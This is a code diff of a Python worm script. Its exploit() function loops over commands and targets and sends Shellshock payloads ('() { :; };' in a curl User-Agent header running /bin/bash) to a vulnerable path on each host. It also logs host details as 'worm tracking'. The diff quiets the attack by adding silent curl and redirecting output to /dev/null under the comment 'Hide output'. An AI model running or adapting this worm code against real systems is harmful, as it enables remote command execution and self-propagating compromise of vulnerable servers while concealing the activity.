@@ -4,11 +4,11 @@ import os, sys, subprocess
 import base64
 from datetime import datetime
 
-# Test payload information
+# Payload
 payload_name = '/tmp/test_payload'
 payload_content = "f = open('/tmp/test_payload_exec','w')"
 
-# Worm tracking information
+# Worm tracking
 def log():
 	timestamp = datetime.now().strftime("%m-%d-%Y %H:%M:%S.%f")
 	hostinfo = os.uname()
@@ -66,9 +66,9 @@ def exploit():
 		url = f'http://{IP}{vulnerable_path}'
 
 		for cmd in cmd_list:
-			exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
+			exploit = 'curl -s -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
 			exploit += '\'' + cmd + '\'"'
-			exploit += ' ' + url
+			exploit += ' ' + url + ' > /dev/null' # Hide output
 			subprocess.run(exploit, shell=True)
 
 def main():
